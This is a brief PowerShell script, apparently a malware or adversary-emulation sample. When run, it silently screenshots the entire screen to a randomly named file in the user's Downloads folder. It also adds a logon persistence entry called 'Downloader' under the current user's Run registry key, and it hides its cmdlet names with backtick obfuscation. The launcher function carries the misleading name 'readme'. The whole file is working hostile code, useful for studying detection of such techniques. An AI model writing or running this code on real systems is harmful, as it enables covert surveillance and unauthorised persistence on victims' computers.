function Invoke-ScreenCapture
{

	$RandomFileName = [System.IO.Path]::GetRandomFileName();
	$Filepath="$env:USERPROFILE\Downloads\$RandomFileName.bmp";
	aDD-T`Y`PE -AssemblyName System.Windows.Forms;
	adD`-t`YpE -AssemblyName System.Drawing;
	$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;
	$Width = $Screen.Width;
	$Height = $Screen.Height;
	$Left = $Screen.Left;
	$Top = $Screen.Top;
	$bitmap = nEW`-ObJ`ecT System.Drawing.Bitmap $Width, $Height;
	$graphic = [System.Drawing.Graphics]::FromImage($bitmap);
	$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size);
	$bitmap.Save($Filepath);

}

function Registry_Runkey{

	New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "Downloader" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Force

}

function readme{

	Registry_Runkey
	Invoke-ScreenCapture
}
readme